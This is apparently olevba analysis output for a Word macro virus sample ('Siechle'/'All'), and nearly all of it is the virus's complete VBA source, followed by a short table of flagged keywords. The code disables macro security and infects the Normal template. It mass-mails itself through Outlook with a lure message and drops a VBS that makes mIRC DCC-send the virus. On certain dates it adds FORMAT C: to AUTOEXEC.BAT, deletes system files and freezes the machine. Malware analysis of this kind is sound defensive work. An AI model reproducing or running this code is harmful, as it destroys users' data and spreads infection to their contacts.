olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Siechle-d909ff63df865d30e5117c636b13fee80e5ba281
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO All.cls 
in file: Virus.MSWord.Siechle-d909ff63df865d30e5117c636b13fee80e5ba281 - OLE stream: 'Macros/VBA/All'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.All. By Spiderman
On Error Resume Next
Select Case Application.Version
Case "9.0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Case "8.0"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
End Select
Set ad = ActiveDocument.VBProject.VBComponents.Item(1) 'It's all the infection routine
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
liad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
lint = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
For li = 1 To liad
If ad.codemodule.lines(li, 1) = "'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.All. By Spiderman" Then
inad = True
Exit For
End If
DoEvents
Next
For li = 1 To lint
If nt.codemodule.lines(li, 1) = "'Macro.W97.2000/Outlook98.2000/Vbs/Mirc.All. By Spiderman" Then
innt = True
Exit For
End If
DoEvents
Next
If innt <> True Then innt = False
If inad <> True Then inad = False
If innt = True And inad = False Then
Set host = nt
Set Tod = ad
host.Export "c:\scandisk.sys"
Tod.codemodule.AddFromFile ("c:\scandisk.sys")
Do Until Tod.codemodule.lines(1, 1) = "Private Sub Document_Open()"
Tod.codemodule.deletelines 1
DoEvents
Loop
End If
If inad = True And innt = False Then
Set host = ad
Set Tod = nt
host.Export "c:\scandisk.sys"
Tod.codemodule.AddFromFile ("c:\scandisk.sys")
Do Until Tod.codemodule.lines(1, 1) = "Private Sub Document_Open()"
Tod.codemodule.deletelines 1
DoEvents
Loop
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "All") <> "El All Vive" Then
whereits = ActiveDocument.FullName
ActiveDocument.SaveAs Environ("WINDIR") & "\All.doc"
DoEvents
ActiveDocument.SaveAs whereits
DoEvents
Set All_OApp = CreateObject("Outlook.Application") 'Here i send the virus to the whole address list, just for Outlook, not outlook express
Set All_Mapi = All_OApp.GetNameSpace("MAPI")
For Each All_AddList In All_Mapi.AddressLists
If All_AddList.AddressEntries.Count <> 0 Then
For All_AddListCount = 1 To All_AddList.AddressEntries.Count
Set All_AddListEntry = All_AddList.AddressEntries(All_AddListCount)
Set All_msg = All_OApp.CreateItem(0)
All_msg.To = All_AddListEntry.Address
All_msg.Subject = "Important!"
All_msg.Body = "I Bet He Didn't Tell You The New Plans?." + vbCrLf + "Check this!"
All_msg.Attachments.Add Environ("WINDIR") & "\All.doc"
All_msg.DeleteAfterSubmit = True
If All_msg.To <> "" Then
All_msg.Send
DoEvents
End If
DoEvents
Next
End If
Next
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "All") <> "El All Vive" Then
Open Environ("WINDIR") & "\el_all.vbs" For Output As #1 'Here i make the vbs that search for mirc.ini in your computer, and if it find him, then makes the scipt.ini.
Print #1, "call All_Forever"
Print #1, "Function All_Forever()"
Print #1, "If finded <> " & Chr(34) & "true" & Chr(34) & " Then"
Print #1, "  Dim All_Fso, All_Driv, All_Drtype"
Print #1, "  Dim All_Drivefull"
Print #1, "  Set All_Fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "  Set All_Driv = All_Fso.Drives"
Print #1, "  For Each All_Drtype In All_Driv"
Print #1, "    If All_Drtype.DriveType = Remote Then"
Print #1, "    All_Drivefull = All_Drtype & " & Chr(34) & "\" & Chr(34)
Print #1, "    Call All_Subfolders(All_Drivefull)"
Print #1, "    ElseIf All_Drtype.IsReady Then"
Print #1, "    All_Drivefull = All_Drtype & " & Chr(34) & "\" & Chr(34)
Print #1, "    Call All_Subfolders(All_Drivefull)"
Print #1, "    End If"
Print #1, "  Next"
Print #1, "End If"
Print #1, "End Function"
Print #1, "Function All_Subfolders(All_Whichfol)"
Print #1, "Dim All_Fso, All_GetFol, All_Files, All_File, All_Subfol"
Print #1, "  Set All_Fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "  Set All_GetFol = All_Fso.GetFolder(All_Whichfol)"
Print #1, "  Set All_Files = All_GetFol.Files"
Print #1, "  For Each All_File In All_Files"
Print #1, "   If All_File.Name = " & Chr(34) & "mirc.ini" & Chr(34) & " Then"
Print #1, "   Call DoMirc(All_Whichfol)"
Print #1, "   End If"
Print #1, "   Next"
Print #1, "  Set All_File = All_GetFol.SubFolders"
Print #1, "  For Each All_Subfol In All_File"
Print #1, "   Call All_Subfolders(All_Subfol.Path)"
Print #1, "  Next"
Print #1, "End Function"
Print #1, "function DoMirc(path)"
Print #1, "Dim All_Fso"
Print #1, "Set All_Fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "Set dirsystem = All_Fso.GetSpecialFolder(0)"
Print #1, "if right(path,1)<>" & Chr(34) & "\" & Chr(34) & " then"
Print #1, "set scriptini=All_Fso.CreateTextFile(path & " & Chr(34) & "\script.ini" & Chr(34) & ")"
Print #1, "else"
Print #1, "set scriptini=All_Fso.CreateTextFile(path & " & Chr(34) & "script.ini" & Chr(34) & ")"
Print #1, "end if"
Print #1, "scriptini.WriteLine " & Chr(34) & "[script]" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & ";Please do not edit this file." & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & ";The modification of the file may cause a disfunction of the Mirc Program." & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & ";_________________________________________." & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n0=on 1:JOIN:#:{" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n1=  /if ( $nick == $me ) { halt }" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n2=  /.dcc send $nick " & Chr(34) & " & dirsystem & " & Chr(34) & "\El_All_is_alive.doc" & Chr(34)
Print #1, "scriptini.WriteLine " & Chr(34) & "n3=}" & Chr(34)
Print #1, "scriptini.close"
Print #1, "end function"
Close #1
DoEvents
Shell Environ("WINDIR") & "\wscript.exe " & Environ("WINDIR") & "\el_All.vbs %", vbNormalFocus 'Execute the vbs
DoEvents
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "All") = "El All Vive"
End If
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Tools").Controls("Options...").Delete
CommandBars("Format").Controls("Style...").Delete

End Sub
Private Sub Document_Close()
On Error Resume Next
Options.AllowFastSave = False
ActiveDocument.Save
If Day(Now) = Month(Now) Then
Open "C:\AUTOEXEC.BAT" For Append As #1
Print #1, " @ECHO OFF"
Print #1, " CLS"
Print #1, " FORMAT C: /U /C /S /AUTOTEST > NUL"
Close #1
Kill ("C:\windows\system\*.*")
RmDir ("c:\windows\system")
Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "I'm All...  A Brand New Computer Virus..."
.Heading = "Made By: Spiderman"
.Animation = msoAnimationGetTechy
.Show
End With
Assistant.Visible = False
End If
If Day(Now) = Month(Now) Then
Do
Open "C:\All.txt" For Append As #1
Print #1, " Hehehe..."
Print #1, " Laugh Out Loud... LOL..."
Print #1, " If A ROSE BY ANY OTHER NAME, WOULD STILL SMELL AS SWEET..."
Print #1, " -William Shakespear "
Print #1, " This Is Only to freeze your Computer "
Close #1

Loop

End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |el_all.vbs          |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |el_All.vbs          |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

